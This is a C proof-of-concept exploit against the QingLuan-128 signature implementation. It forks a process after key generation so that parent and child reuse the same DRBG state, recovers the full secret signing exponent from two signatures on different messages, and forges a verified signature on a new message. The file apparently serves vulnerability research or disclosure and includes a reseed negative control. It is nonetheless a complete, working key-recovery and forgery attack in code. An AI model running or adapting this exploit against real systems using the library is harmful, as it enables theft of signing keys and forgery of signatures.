/*
 * Exact local PoC for QingLuan-128:
 *
 *   1. Generate a key, which initializes the process's thread-local DRBG.
 *   2. fork();
 *   3. Have parent and child each sign a different message.
 *
 * The child inherits a byte-for-byte copy of the DRBG state. Without an
 * explicit per-process reseed, both signatures therefore use the same
 * master_seed and salt. If a round is opened on branch chall2=1 in one
 * signature and chall2=0 in the other, the first exposes eta'_i and the
 * second exposes v_i=eta_i-eta'_i (mod 7). Thus one differing round recovers
 * the complete signing exponent eta in F_7^127. The program then:
 *
 *   - checks the recovered eta against the public-key syndrome;
 *   - checks it equals the key's actual secret exponent (diagnostic control);
 *   - creates and verifies a signature on a fresh message using only pk and
 *     the recovered eta.
 *
 * Build and run from the QingLuan-128 directory:
 *
 *   gcc -std=c11 -O2 -Wall -Wextra -Wpedantic -Iinclude \
 *     src/fq_arith.c src/hash.c src/utils.c src/restr.c src/rsdp.c \
 *     src/mpc.c src/keygen.c src/sign.c src/verify.c src/selftest.c \
 *     /path/to/fork_drbg_reuse_recovery.c -o /tmp/qingluan_fork_poc
 *   /tmp/qingluan_fork_poc
 */

#define _POSIX_C_SOURCE 200809L

#include "api.h"
#include "hash.h"
#include "mpc.h"
#include "params.h"
#include "restr.h"
#include "rsdp.h"
#include "sign.h"
#include "utils.h"

#include <errno.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

static int write_all(int fd, const void *buf, size_t len)
{
    const uint8_t *p = (const uint8_t *)buf;
    while (len != 0) {
        ssize_t n = write(fd, p, len);
        if (n < 0) {
            if (errno == EINTR) continue;
            return -1;
        }
        p += (size_t)n;
        len -= (size_t)n;
    }
    return 0;
}

static int read_all(int fd, void *buf, size_t len)
{
    uint8_t *p = (uint8_t *)buf;
    while (len != 0) {
        ssize_t n = read(fd, p, len);
        if (n == 0) return -1;
        if (n < 0) {
            if (errno == EINTR) continue;
            return -1;
        }
        p += (size_t)n;
        len -= (size_t)n;
    }
    return 0;
}

static int exp_matches_public_syndrome(const unsigned char *pk,
                                       const uint8_t *eta)
{
    fq_t *V = (fq_t *)malloc((size_t)PARAM_R * PARAM_K * sizeof(fq_t));
    fq_t e[PARAM_N];
    fq_t got[PARAM_R];
    fq_t want[PARAM_R];
    int ok = 0;

    if (V == NULL) return 0;
    rsdp_expand_matrix(V, pk);
    restr_vec_from_exp(e, eta, PARAM_N);
    rsdp_compute_syndrome(got, V, e);
    if (rsdp_unpack_fp(want, pk + PARAM_KEYSEED_BYTES, PARAM_R) == 0)
        ok = memcmp(got, want, sizeof(got)) == 0;

    free(V);
    return ok;
}

/*
 * Sign with a recovered exponent witness. This mirrors the submitted signer,
 * except that it starts with eta directly instead of expanding eta from sk.
 */
static int sign_with_witness(unsigned char *sig,
                             const unsigned char *m, size_t mlen,
                             const unsigned char *pk, const uint8_t *eta,
                             const uint8_t *master_seed,
                             const uint8_t *salt)
{
    int ret = -1;
    fq_t *V = NULL;
    fq_t *e = NULL;
    uint8_t *seed_leaves = NULL;
    uint8_t *cmt0_all = NULL;
    uint8_t *cmt1_all = NULL;
    uint8_t *v_exp_all = NULL;
    fq_t *y_all = NULL;
    uint8_t pk_hash[PARAM_HASH_BYTES];
    uint8_t digest_cmt[PARAM_HASH_BYTES];
    uint8_t digest_msg[PARAM_HASH_BYTES];
    uint8_t digest_chall1[PARAM_HASH_BYTES];
    uint8_t digest_chall2[PARAM_HASH_BYTES];
    fq_t chall1[PARAM_TAU];
    uint8_t chall2[PARAM_TAU];

    V = (fq_t *)malloc((size_t)PARAM_R * PARAM_K * sizeof(fq_t));
    e = (fq_t *)malloc((size_t)PARAM_N * sizeof(fq_t));
    seed_leaves = (uint8_t *)malloc((size_t)PARAM_TAU * PARAM_SEED_BYTES);
    cmt0_all = (uint8_t *)malloc((size_t)PARAM_TAU * PARAM_HASH_BYTES);
    cmt1_all = (uint8_t *)malloc((size_t)PARAM_TAU * PARAM_HASH_BYTES);
    v_exp_all = (uint8_t *)malloc((size_t)PARAM_TAU * PARAM_N);
    y_all = (fq_t *)malloc((size_t)PARAM_TAU * PARAM_N * sizeof(fq_t));
    if (!V || !e || !seed_leaves || !cmt0_all || !cmt1_all ||
        !v_exp_all || !y_all)
        goto cleanup;

    rsdp_expand_matrix(V, pk);
    restr_vec_from_exp(e, eta, PARAM_N);
    hash_digest(pk_hash, pk, QINGLUAN_PK_BYTES);

    {
        xof_ctx_t xof;
        uint8_t d = DOMAIN_SEEDLEAVES;
        xof_init(&xof);
        xof_absorb(&xof, &d, 1);
        xof_absorb(&xof, master_seed, PARAM_SEED_BYTES);
        xof_absorb(&xof, salt, PARAM_SALT_BYTES);
        xof_finalize(&xof);
        xof_squeeze(&xof, seed_leaves,
                    (size_t)PARAM_TAU * PARAM_SEED_BYTES);
        secure_zero(&xof, sizeof(xof));
    }

    {
        uint8_t eta_p[PARAM_N];
        fq_t u_p[PARAM_N];
        for (int i = 0; i < PARAM_TAU; i++) {
            uint16_t dom = (uint16_t)(i + PARAM_C);
            const uint8_t *seed_i =
                seed_leaves + (size_t)i * PARAM_SEED_BYTES;
            mpc_expand_round(eta_p, u_p, seed_i, salt, dom);
            mpc_commit0(cmt0_all + (size_t)i * PARAM_HASH_BYTES,
                        v_exp_all + (size_t)i * PARAM_N,
                        eta, eta_p, u_p, V, salt, dom);
            mpc_commit1(cmt1_all + (size_t)i * PARAM_HASH_BYTES,
                        seed_i, salt, dom);
        }
        secure_zero(eta_p, sizeof(eta_p));
        secure_zero(u_p, sizeof(u_p));
    }

    mpc_digest_cmt(digest_cmt, cmt0_all, cmt1_all);
    mpc_digest_msg(digest_msg, salt, pk_hash, m, mlen);
    mpc_digest_chall1(digest_chall1, digest_msg, digest_cmt, salt);
    mpc_gen_chall1(chall1, digest_chall1);

    {
        uint8_t eta_p[PARAM_N];
        fq_t u_p[PARAM_N];
        for (int i = 0; i < PARAM_TAU; i++) {
            uint16_t dom = (uint16_t)(i + PARAM_C);
            const uint8_t *seed_i =
                seed_leaves + (size_t)i * PARAM_SEED_BYTES;
            mpc_expand_round(eta_p, u_p, seed_i, salt, dom);
            mpc_compute_y(y_all + (size_t)i * PARAM_N,
                          u_p, eta_p, chall1[i]);
        }
        secure_zero(eta_p, sizeof(eta_p));
        secure_zero(u_p, sizeof(u_p));
    }

    mpc_digest_chall2(digest_chall2, y_all, digest_chall1);
    mpc_gen_chall2(chall2, digest_chall2);

    memcpy(sig + SIG_OFF_SALT, salt, PARAM_SALT_BYTES);
    memcpy(sig + SIG_OFF_DIGEST_CMT, digest_cmt, PARAM_HASH_BYTES);
    memcpy(sig + SIG_OFF_DIGEST_CHALL2, digest_chall2, PARAM_HASH_BYTES);

    {
        size_t op = SIG_OFF_PATH;
        size_t opr = SIG_OFF_PROOF;
        size_t ore = SIG_OFF_RESP;
        for (int i = 0; i < PARAM_TAU; i++) {
            if (chall2[i] == 1) {
                memcpy(sig + op,
                       seed_leaves + (size_t)i * PARAM_SEED_BYTES,
                       PARAM_SEED_BYTES);
                op += PARAM_SEED_BYTES;
                memcpy(sig + opr,
                       cmt0_all + (size_t)i * PARAM_HASH_BYTES,
                       PARAM_HASH_BYTES);
                opr += PARAM_HASH_BYTES;
            } else {
                rsdp_pack_fp(sig + ore,
                             y_all + (size_t)i * PARAM_N, PARAM_N);
                ore += QINGLUAN_Y_BYTES;
                rsdp_pack_fz(sig + ore,
                             v_exp_all + (size_t)i * PARAM_N, PARAM_N);
                ore += QINGLUAN_V_BYTES;
                memcpy(sig + ore,
                       cmt1_all + (size_t)i * PARAM_HASH_BYTES,
                       PARAM_HASH_BYTES);
                ore += PARAM_HASH_BYTES;
            }
        }
    }

    ret = 0;

cleanup:
    secure_zero(chall1, sizeof(chall1));
    if (seed_leaves) {
        secure_zero(seed_leaves,
                    (size_t)PARAM_TAU * PARAM_SEED_BYTES);
    }
    if (v_exp_all) {
        secure_zero(v_exp_all, (size_t)PARAM_TAU * PARAM_N);
    }
    if (y_all) {
        secure_zero(y_all,
                    (size_t)PARAM_TAU * PARAM_N * sizeof(fq_t));
    }
    free(seed_leaves);
    free(cmt0_all);
    free(cmt1_all);
    free(v_exp_all);
    free(y_all);
    free(e);
    free(V);
    return ret;
}

int main(int argc, char **argv)
{
    unsigned char pk[QINGLUAN_PK_BYTES];
    unsigned char sk[QINGLUAN_SK_BYTES];
    unsigned char sig_parent[QINGLUAN_SIG_BYTES];
    unsigned char sig_child[QINGLUAN_SIG_BYTES];
    const unsigned char msg_parent[] = "fork-side message A";
    const unsigned char msg_child[] = "fork-side message B";
    const unsigned char msg_fresh[] = "fresh message forged from recovered witness";
    unsigned char forged[QINGLUAN_SIG_BYTES];
    uint8_t eta_recovered[PARAM_N] = {0};
    uint8_t eta_real[PARAM_N] = {0};
    uint8_t seed_e_real[PARAM_KEYSEED_BYTES];
    uint8_t seed_pk_real[PARAM_KEYSEED_BYTES];
    uint8_t chall2_parent[PARAM_TAU];
    uint8_t chall2_child[PARAM_TAU];
    int pipefd[2];
    pid_t pid;
    int status = 0;
    int differing_rounds = 0;
    int recovered_round = -1;
    size_t parent_siglen = 0;
    size_t child_siglen = 0;
    int reseed_child =
        (argc == 2 && strcmp(argv[1], "reseed-control") == 0);

    if (argc > 2 || (argc == 2 && !reseed_child)) {
        fprintf(stderr, "usage: %s [reseed-control]\n", argv[0]);
        return 2;
    }

    /*
     * Key generation initializes the DRBG. The attacker does not need its
     * state or seed; it only needs the victim process to fork after init.
     */
    if (crypto_sign_keypair(pk, sk) != 0) {
        fprintf(stderr, "key generation failed\n");
        return 1;
    }

    if (pipe(pipefd) != 0) {
        perror("pipe");
        return 1;
    }

    pid = fork();
    if (pid < 0) {
        perror("fork");
        return 1;
    }

    if (pid == 0) {
        int rc;
        close(pipefd[0]);
        /*
         * Negative control: explicitly reseed the child's inherited DRBG.
         * This models the missing process-boundary reseed and should prevent
         * the two signatures from sharing their per-signature randomizers.
         */
        if (reseed_child && drbg_init() != 0)
            _exit(3);
        rc = crypto_sign_signature(
            sig_child, &child_siglen, msg_child, sizeof(msg_child) - 1, sk);
        if (rc != 0 ||
            write_all(pipefd[1], &child_siglen, sizeof(child_siglen)) != 0 ||
            write_all(pipefd[1], sig_child, child_siglen) != 0) {
            _exit(2);
        }
        close(pipefd[1]);
        _exit(0);
    }

    close(pipefd[1]);
    if (crypto_sign_signature(
            sig_parent, &parent_siglen,
            msg_parent, sizeof(msg_parent) - 1, sk) != 0) {
        fprintf(stderr, "parent signing failed\n");
        return 1;
    }
    if (read_all(pipefd[0], &child_siglen, sizeof(child_siglen)) != 0 ||
        child_siglen != QINGLUAN_SIG_BYTES ||
        read_all(pipefd[0], sig_child, child_siglen) != 0) {
        fprintf(stderr, "child signature transport failed\n");
        return 1;
    }
    close(pipefd[0]);
    if (waitpid(pid, &status, 0) < 0 ||
        !WIFEXITED(status) || WEXITSTATUS(status) != 0) {
        fprintf(stderr, "child signing failed\n");
        return 1;
    }

    if (parent_siglen != QINGLUAN_SIG_BYTES ||
        crypto_sign_verify(sig_parent, parent_siglen,
                           msg_parent, sizeof(msg_parent) - 1, pk) != 0 ||
        crypto_sign_verify(sig_child, child_siglen,
                           msg_child, sizeof(msg_child) - 1, pk) != 0) {
        fprintf(stderr, "honest control signature failed\n");
        return 1;
    }

    if (memcmp(sig_parent + SIG_OFF_SALT,
               sig_child + SIG_OFF_SALT, PARAM_SALT_BYTES) != 0) {
        if (reseed_child) {
            printf("negative control passed\n");
            printf("salt_equal_after_fork=no\n");
            printf("per_process_reseed_prevents_randomizer_reuse=yes\n");
            return 0;
        }
        fprintf(stderr,
                "DRBG outputs diverged after fork; attack precondition absent\n");
        return 3;
    }

    if (reseed_child) {
        fprintf(stderr,
                "negative control unexpectedly retained identical salt\n");
        return 1;
    }

    mpc_gen_chall2(chall2_parent, sig_parent + SIG_OFF_DIGEST_CHALL2);
    mpc_gen_chall2(chall2_child, sig_child + SIG_OFF_DIGEST_CHALL2);

    {
        size_t op_parent = SIG_OFF_PATH;
        size_t op_child = SIG_OFF_PATH;
        size_t opr_parent = SIG_OFF_PROOF;
        size_t opr_child = SIG_OFF_PROOF;
        size_t ore_parent = SIG_OFF_RESP;
        size_t ore_child = SIG_OFF_RESP;

        for (int i = 0; i < PARAM_TAU; i++) {
            const uint8_t *parent_seed = sig_parent + op_parent;
            const uint8_t *child_seed = sig_child + op_child;
            const uint8_t *parent_v = NULL;
            const uint8_t *child_v = NULL;

            if (chall2_parent[i] == 1) {
                op_parent += PARAM_SEED_BYTES;
                opr_parent += PARAM_HASH_BYTES;
            } else {
                ore_parent += QINGLUAN_Y_BYTES;
                parent_v = sig_parent + ore_parent;
                ore_parent += QINGLUAN_V_BYTES + PARAM_HASH_BYTES;
            }

            if (chall2_child[i] == 1) {
                op_child += PARAM_SEED_BYTES;
                opr_child += PARAM_HASH_BYTES;
            } else {
                ore_child += QINGLUAN_Y_BYTES;
                child_v = sig_child + ore_child;
                ore_child += QINGLUAN_V_BYTES + PARAM_HASH_BYTES;
            }

            if (chall2_parent[i] == chall2_child[i])
                continue;

            differing_rounds++;
            if (recovered_round < 0) {
                const uint8_t *seed_1 =
                    chall2_parent[i] == 1 ? parent_seed : child_seed;
                const uint8_t *v_0 =
                    chall2_parent[i] == 0 ? parent_v : child_v;
                uint8_t eta_prime[PARAM_N];
                uint8_t v_exp[PARAM_N];
                fq_t u_prime[PARAM_N];

                if (seed_1 == NULL || v_0 == NULL ||
                    rsdp_unpack_fz(v_exp, v_0, PARAM_N) != 0) {
                    fprintf(stderr, "failed to parse an opposing branch\n");
                    return 1;
                }

                mpc_expand_round(eta_prime, u_prime, seed_1,
                                 sig_parent + SIG_OFF_SALT,
                                 (uint16_t)(i + PARAM_C));
                for (int j = 0; j < PARAM_N; j++)
                    eta_recovered[j] =
                        restr_exp_add(eta_prime[j], v_exp[j]);
                recovered_round = i;
            }
        }
    }

    if (recovered_round < 0 ||
        !exp_matches_public_syndrome(pk, eta_recovered)) {
        fprintf(stderr,
                "no usable differing round or recovered witness failed\n");
        return 3;
    }

    /* Diagnostic only: compare against the hidden exponent of this test key. */
    rsdp_keypair_seeds(seed_e_real, seed_pk_real, sk);
    rsdp_gen_secret_exp(eta_real, seed_e_real);

    if (memcmp(eta_recovered, eta_real, PARAM_N) != 0) {
        fprintf(stderr, "recovered witness differs from generating witness\n");
        return 1;
    }

    {
        uint8_t master_seed[PARAM_SEED_BYTES];
        uint8_t forge_salt[PARAM_SALT_BYTES];
        for (int i = 0; i < PARAM_SEED_BYTES; i++)
            master_seed[i] = (uint8_t)(i + 1);
        for (int i = 0; i < PARAM_SALT_BYTES; i++)
            forge_salt[i] = (uint8_t)(0xa0 + i);

        if (sign_with_witness(forged, msg_fresh, sizeof(msg_fresh) - 1,
                              pk, eta_recovered,
                              master_seed, forge_salt) != 0 ||
            crypto_sign_verify(forged, QINGLUAN_SIG_BYTES,
                               msg_fresh, sizeof(msg_fresh) - 1, pk) != 0) {
            fprintf(stderr, "forgery with recovered witness failed\n");
            return 1;
        }
    }

    printf("attack succeeded\n");
    printf("pk_bytes=%d sk_bytes=%d sig_bytes=%d\n",
           QINGLUAN_PK_BYTES, QINGLUAN_SK_BYTES, QINGLUAN_SIG_BYTES);
    printf("salt_equal_after_fork=yes\n");
    printf("challenge_branch_differences=%d\n", differing_rounds);
    printf("recovered_full_witness_from_round=%d\n", recovered_round);
    printf("recovered_witness_matches_public_syndrome=yes\n");
    printf("recovered_witness_matches_generating_exponent=yes\n");
    printf("fresh_message_signature_verified=yes\n");
    return 0;
}
